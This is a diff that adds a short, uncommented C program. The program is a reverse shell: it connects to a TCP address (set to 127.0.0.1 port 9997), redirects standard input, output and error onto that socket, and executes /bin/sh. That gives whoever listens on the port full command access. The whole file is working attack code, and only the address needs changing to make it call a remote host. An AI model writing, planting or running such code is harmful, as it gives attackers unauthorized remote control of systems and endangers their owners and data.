@@ -1,0 +1,30 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define REMOTE_ADDR "127.0.0.1"
+#define REMOTE_PORT 9997
+
+int main(int argc, char *argv[])
+{
+	struct sockaddr_in sa;
+	int s;
+	char *args[] = {"/bin/sh", 0}; 
+
+	sa.sin_family = AF_INET;
+	sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+	sa.sin_port = htons(REMOTE_PORT);
+
+	s = socket(AF_INET, SOCK_STREAM, 0);
+	connect(s, (struct sockaddr *)&sa, sizeof(sa));
+	
+	dup2(s, 0);
+	dup2(s, 1);
+	dup2(s, 2);
+
+	execve("/bin/sh", args, 0);
+	return 0;
+}
